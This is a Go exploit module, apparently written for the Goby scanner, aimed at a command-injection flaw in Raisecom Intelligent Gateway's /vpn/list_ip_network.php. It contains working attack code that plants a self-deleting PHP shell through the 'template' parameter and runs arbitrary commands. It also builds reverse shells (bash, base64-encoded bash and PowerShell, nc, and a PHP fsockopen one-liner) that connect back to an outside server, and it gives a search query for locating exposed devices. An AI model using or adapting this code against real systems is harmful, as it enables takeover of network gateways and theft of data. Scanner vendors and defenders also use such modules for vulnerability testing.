package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Raisecom Intelligent Gateway /vpn/list_ip_network.php Command Execution Vulnerability",
    "Description": "<p>Raisecom Intelligent Gateway is a smart gateway device that provides various network management functions and services. The /vpn/list_ip_network.php interface of Raisecom Intelligent Gateway has a command execution vulnerability, allowing attackers to execute arbitrary system commands on the target server, potentially leading to full server compromise, sensitive data leakage, or service disruption.</p>",
    "Product": "Raisecom Intelligent Gateway",
    "Homepage": "http://www.raisecom.com.cn/",
    "DisclosureDate": "2024-10-27",
    "PostTime": "2025-01-23",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"/images/raisecom/back.gif\" && title==\"Web user login\"",
    "GobyQuery": "body=\"/images/raisecom/back.gif\" && title==\"Web user login\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary system commands on the target server, potentially leading to full server compromise, sensitive data leakage, or service disruption.</p>",
    "Recommendation": "<p>1. Restrict access to the /vpn/list_ip_network.php interface.2. Inspect and fix code vulnerabilities that may lead to command injection.3. Update Raisecom Intelligent Gateway to the latest version to patch this vulnerability.</p>",
    "References": [
        "https://github.com/20142995/wxvl/blob/b7b57d75142e7725f0c2114755a0b7213d42fd07/doc/%E7%91%9E%E6%96%AF%E5%BA%B7%E8%BE%BE%E6%99%BA%E8%83%BD%E7%BD%91%E5%85%B3%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "ls",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBash,ByBashBase64,ByPowershellBase64,BySh,ByPowershell,ByNcBsd,ByPhp",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "瑞斯康达智能网关 /vpn/list_ip_network.php 命令执行漏洞",
            "Product": "瑞斯康达智能网关",
            "Description": "<p>瑞斯康达智能网关是一款提供多种网络管理功能和服务的智能网关设备。其 /vpn/list_ip_network.php 接口存在命令执行漏洞，攻击者可以利用该漏洞在目标服务器上执行任意系统命令，可能导致服务器被完全控制，敏感数据泄露或服务中断。</p>",
            "Recommendation": "<p>1. 限制 /vpn/list_ip_network.php 接口的访问权限。2. 检查并修复代码中可能导致命令注入的漏洞。3. 更新瑞斯康达智能网关至最新版本以修复该漏洞。</p>",
            "Impact": "<p>攻击者可以利用该漏洞在目标服务器上执行任意系统命令，可能导致服务器被完全控制，敏感数据泄露或服务中断。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Raisecom Intelligent Gateway /vpn/list_ip_network.php Command Execution Vulnerability",
            "Product": "Raisecom Intelligent Gateway",
            "Description": "<p>Raisecom Intelligent Gateway is a smart gateway device that provides various network management functions and services. The /vpn/list_ip_network.php interface of Raisecom Intelligent Gateway has a command execution vulnerability, allowing attackers to execute arbitrary system commands on the target server, potentially leading to full server compromise, sensitive data leakage, or service disruption.</p>",
            "Recommendation": "<p>1. Restrict access to the /vpn/list_ip_network.php interface.2. Inspect and fix code vulnerabilities that may lead to command injection.3. Update Raisecom Intelligent Gateway to the latest version to patch this vulnerability.</p>",
            "Impact": "<p>Attackers can exploit this vulnerability to execute arbitrary system commands on the target server, potentially leading to full server compromise, sensitive data leakage, or service disruption.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "VariablesOrder": [],
    "EditType": "fast",
    "PocId": "9984"
}`
	setPayloadRequestHashQgADHXUY627YD7A89r9 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//写入文件
		filename := goutils.RandomHexString(8) + ".php"
		payload := "`echo -e '<?php $test = \"" + command + "\";$last = system($test);unlink(__FILE__);?>'>/www/tmp/" + filename + "`"
		//将payload进行url编码
		payload = url.QueryEscape(payload)
		getRequestConfig := httpclient.NewGetRequestConfig("/vpn/list_ip_network.php?Nradius_submit=1&template=" + payload)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = true
		getRequestConfig.Timeout = 15
		head1 := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
		}
		for headName, headValue := range head1 {
			getRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		resp, err1 := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err1 != nil || resp == nil {
			return "", "", err1
		} //错误检查

		//命令执行
		//漏洞url地址
		vulPath := "/vpn/list_ip_network.php"
		getRequestConfig1 := httpclient.NewGetRequestConfig("/tmp/" + filename)
		getRequestConfig1.VerifyTls = false
		getRequestConfig1.FollowRedirect = false
		//请求头
		head := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
		}
		for headName, headValue := range head {
			getRequestConfig1.Header.Store(headName, headValue)
		}
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig1)
		if err != nil || response == nil {
			return "", "", err
		} //错误检查

		return response.RawBody, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgADHXUY627YD7A89r9

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgADHXUY627YD7A89r9

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByPhP := func(rp string) string {
				return fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"sh <&3 >&3 2>&3\");'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByPhp":              ReverseTcpByPhP,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
